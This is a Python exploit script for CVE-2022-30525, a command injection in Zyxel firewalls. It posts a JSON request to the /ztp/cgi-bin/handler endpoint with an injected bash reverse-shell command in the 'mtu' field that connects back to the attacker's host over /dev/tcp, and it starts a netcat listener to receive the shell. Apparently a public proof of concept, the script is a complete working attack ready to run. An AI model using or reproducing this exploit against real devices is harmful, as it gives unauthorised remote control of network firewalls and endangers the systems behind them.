import argparse
import requests
import urllib3
import time
import json
import sys
import os
urllib3.disable_warnings()


def do_banner():
    print("")
    print("$$\    $$\ $$\             $$\                         $$\                             ")
    print("$$ |   $$ |\__|            $$ |                        \__|                            ")
    print("$$ |   $$ |$$\  $$$$$$$\ $$$$$$\    $$$$$$\   $$$$$$\  $$\  $$$$$$\  $$$$$$$\          ")
    print("\$$\  $$  |$$ |$$  _____|\_$$  _|  $$  __$$\ $$  __$$\ $$ | \____$$\ $$  __$$\         ")
    print(" \$$\$$  / $$ |$$ /        $$ |    $$ /  $$ |$$ |  \__|$$ | $$$$$$$ |$$ |  $$ |        ")
    print("  \$$$  /  $$ |$$ |        $$ |$$\ $$ |  $$ |$$ |      $$ |$$  __$$ |$$ |  $$ |        ")
    print("   \$  /   $$ |\$$$$$$$\   \$$$$  |\$$$$$$  |$$ |      $$ |\$$$$$$$ |$$ |  $$ |        ")
    print("$$\ \_/  $$\__| \_______|   \____$$\\______$$\__|      \__| \_______|\__|  \__|        ")
    print("$$$\    $$$ |                    $$ |      \__|                                        ")
    print("$$$$\  $$$$ | $$$$$$\   $$$$$$$\ $$$$$$$\  $$\ $$$$$$$\   $$$$$$\   $$$$$$\  $$\   $$\ ")
    print("$$\$$\$$ $$ | \____$$\ $$  _____|$$  __$$\ $$ |$$  __$$\ $$  __$$\ $$  __$$\ $$ |  $$ |")
    print("$$ \$$$  $$ | $$$$$$$ |$$ /      $$ |  $$ |$$ |$$ |  $$ |$$$$$$$$ |$$ |  \__|$$ |  $$ |")
    print("$$ |\$  /$$ |$$  __$$ |$$ |      $$ |  $$ |$$ |$$ |  $$ |$$   ____|$$ |      $$ |  $$ |")
    print("$$ | \_/ $$ |\$$$$$$$ |\$$$$$$$\ $$ |  $$ |$$ |$$ |  $$ |\$$$$$$$\ $$ |      \$$$$$$$ |")
    print("\__|     \__| \_______| \_______|\__|  \__|\__|\__|  \__| \_______|\__|       \____$$ |")
    print("                                                                             $$\   $$ |")
    print("                                  ⚙ jbaines-r7                              \$$$$$$  |")
    print("                                 CVE-2022-30525                              \______/ ")
    print("                                       🦞                                             ")
    print("") 


if __name__ == "__main__":

    do_banner()

    parser = argparse.ArgumentParser(description='Zyxel Firewall Command Injection (CVE-2022-30525)')
    parser.add_argument('--rhost', action="store", dest="rhost", required=True, help="The remote address to exploit")
    parser.add_argument('--rport', action="store", dest="rport", type=int, help="The remote port to exploit", default="443")
    parser.add_argument('--lhost', action="store", dest="lhost", required=True, help="The local address to connect back to")
    parser.add_argument('--lport', action="store", dest="lport", type=int, help="The local port to connect back to", default="1270")
    parser.add_argument('--protocol', action="store", dest="protocol", help="The protocol handler to use", default="https://")
    parser.add_argument('--nc-path', action="store", dest="ncpath", help="The path to nc", default="/usr/bin/nc")
    args = parser.parse_args()

    pid = os.fork()
    if pid == 0:
        time.sleep(1)
        bash_exploit = ";bash -c 'exec bash -i &>/dev/tcp/" + args.lhost + '/' + str(args.lport) + " <&1';"
        payload = {
          'command': 'setWanPortSt',
          'proto': 'dhcp',
          'port': '1270',
          'vlan_tagged': '1270',
          'vlanid': '1270',
          'mtu': bash_exploit,
          'data':''
        }
        
        headers = { 'Content-Type': 'application/json; charset=utf-8'}
        
        url = args.protocol + args.rhost + ":" + str(args.rport) + "/ztp/cgi-bin/handler"
        print("[+] Sending a POST request to " + url)
        try:
            r = requests.post(url, headers=headers, json=payload, verify=False, timeout=5)
            
            # we really don't expect a response
            if r.status_code != 503:
                print('[-] Exploitation failed.')
                sys.exit(0)
        except:
            pass
    else:
        print('[+] Executing netcat listener')
        print('[+] Using ' + args.ncpath)
        os.execv(args.ncpath, [args.ncpath, '-lvnp ' + str(args.lport)])

